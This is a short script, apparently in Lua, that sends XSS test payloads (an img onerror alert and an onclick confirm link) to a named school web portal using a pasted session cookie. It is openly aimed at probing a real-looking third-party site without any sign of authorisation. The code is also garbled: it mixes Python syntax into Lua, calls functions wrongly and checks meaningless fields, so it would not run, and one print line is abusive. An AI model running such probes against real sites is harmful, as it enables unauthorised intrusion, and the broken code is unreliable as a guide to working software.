local httprequest = require 'httprequest'
local cookie = "" -- put PHPSESSID here
url = "https://kcis.eclass.hk"

local params = "?smsg=1|=|"

function login()
    httprequest.run(cookie, url=url)
end


local payloads = setmetatable("workspace", mtb) {
    ["Payload"] = """><img src=x onerror=alert(1)"">"
    ["Payload 2"] = "<a href=""#"" onclick=confirm(1)""
    -- put more payloads here
}

for i,v in next, payloads do
    httprequest(url+params)
    payloads.append(params)
    json.encode(payloads.__index)
    if v.__namecall == params then 
        print("payload(s) executed.")
    else 
        print("wait you fucking retard")
        return v 
    end
end


return login -- run func????